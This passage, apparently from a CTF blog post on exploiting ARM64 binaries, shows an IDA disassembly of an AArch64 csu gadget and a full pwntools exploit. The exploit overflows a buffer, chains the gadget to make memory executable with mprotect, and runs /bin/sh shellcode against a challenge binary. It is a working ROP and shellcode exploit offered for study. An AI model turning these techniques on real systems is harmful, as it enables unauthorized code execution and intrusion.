<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 位于main函数下方的csu函数</span><br><span class="line">.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j</span><br><span class="line">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0                 MOV             X2, X22</span><br><span class="line">.text:00000000004008B4                 MOV             X1, X23</span><br><span class="line">.text:00000000004008B8                 MOV             W0, W24</span><br><span class="line">.text:00000000004008BC                 ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0                 BLR             X3</span><br><span class="line">.text:00000000004008C4                 CMP             X19, X20</span><br><span class="line">.text:00000000004008C8                 B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j</span><br><span class="line">.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span><br><span class="line">.text:00000000004008DC                 RET</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">localfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment"># locallibc = &quot;&quot;</span></span><br><span class="line">context.binary = localfile</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j</span></span><br><span class="line"><span class="string">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span></span><br><span class="line"><span class="string">.text:00000000004008B0                 MOV             X2, X22</span></span><br><span class="line"><span class="string">.text:00000000004008B4                 MOV             X1, X23</span></span><br><span class="line"><span class="string">.text:00000000004008B8                 MOV             W0, W24</span></span><br><span class="line"><span class="string">.text:00000000004008BC                 ADD             X19, X19, #1</span></span><br><span class="line"><span class="string">.text:00000000004008C0                 BLR             X3</span></span><br><span class="line"><span class="string">.text:00000000004008C4                 CMP             X19, X20</span></span><br><span class="line"><span class="string">.text:00000000004008C8                 B.NE            loc_4008AC</span></span><br><span class="line"><span class="string">.text:00000000004008CC</span></span><br><span class="line"><span class="string">.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j</span></span><br><span class="line"><span class="string">.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span></span><br><span class="line"><span class="string">.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span></span><br><span class="line"><span class="string">.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span></span><br><span class="line"><span class="string">.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span></span><br><span class="line"><span class="string">.text:00000000004008DC                 RET</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">X21 = address of function address</span></span><br><span class="line"><span class="string">X22 = X2</span></span><br><span class="line"><span class="string">X23 = X1</span></span><br><span class="line"><span class="string">W24 = W0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu_rop</span>(<span class="params">call, x0, x1, x2, ret</span>):</span></span><br><span class="line">    payload  = p64(<span class="number">0x4008CC</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x4008AC</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call) + p64(x2)</span><br><span class="line">    payload += p64(x1) + p64(x0)</span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>) + p64(ret)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sc = asm(shellcraft.execve(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    io.send(sc)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x48</span> + csu_rop(elf.got[<span class="string">&quot;read&quot;</span>], <span class="number">0</span>, elf.got[<span class="string">&quot;__gmon_start__&quot;</span>], <span class="number">8</span>, <span class="number">0x400824</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(p64(elf.plt[<span class="string">&quot;mprotect&quot;</span>]))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">    io.send(sc)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x48</span> + csu_rop(elf.got[<span class="string">&quot;__gmon_start__&quot;</span>], <span class="number">0x411000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, <span class="number">0x411068</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line"><span class="comment"># libc = ELF(locallibc)</span></span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a target="_blank" rel="noopener" href="https://m4x.fun/post/how-2-pwn-an-arm-binary/">如何 pwn 掉一个 arm 的binary</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/199112">ARM架构下的 Pwn 的一般解决思路</a></li>
<li><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/qemu.html">pwntools doc: QEMU Utilities</a></li>
<li><a target="_blank" rel="noopener" href="https://azeria-labs.com/writing-arm-assembly-part-1/">ARM Assembly Basics Tutorial Series by Azeria</a></li>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/53268118/whats-the-difference-between-mov-movz-movn-and-movk-in-armv8-assembly">aarch64 movk movn movz</a></li>
</ol>

      </div>
      <div class="post-copyright">
    <p class="copyright-item">
      <span>Author: </span>
      <a href="http://hhdx.xyz">hhdx</a>
    </p>
    <p class="copyright-item">
      <span>Link: </span>
      <a href="http://hhdx.xyz/2020/10/17/Arm-pwn/">http://hhdx.xyz/2020/10/17/Arm-pwn/</a>
    </p>
    <p class="copyright-item">
      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
    </p>
  </div>
      <footer class="post-footer">
        <div class="post-tags">
            <a href="/tags/CTF/">CTF</a>
            <a href="/tags/ARM/">ARM</a>
            </div>
        
        <nav class="post-nav"><a class="next" href="/2020/09/07/pwnable-tw-re-alloc-revenge/">
        <span class="next-text nav-default">pwnable.tw re-alloc_revenge</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"><div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a target="_blank" rel="noopener" href="https://github.com/lc1838228782" class="iconfont icon-github" title="github"></a>
        <a target="_blank" rel="noopener" href="https://www.douban.com/people/57285004/" class="iconfont icon-douban" title="douban"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">&copy;2016 - 2020<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">hhdx</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript">
    var disqus_config = function () {
        this.page.url = 'http://hhdx.xyz/2020/10/17/Arm-pwn/';
        this.page.identifier = '2020/10/17/Arm-pwn/';
        this.page.title = 'Arm pwn';
    };
    (function() {
    var d = document, s = d.createElement('script');

    s.src = '//lyliuchao.disqus.com/embed.js';

    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();  
  </script><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
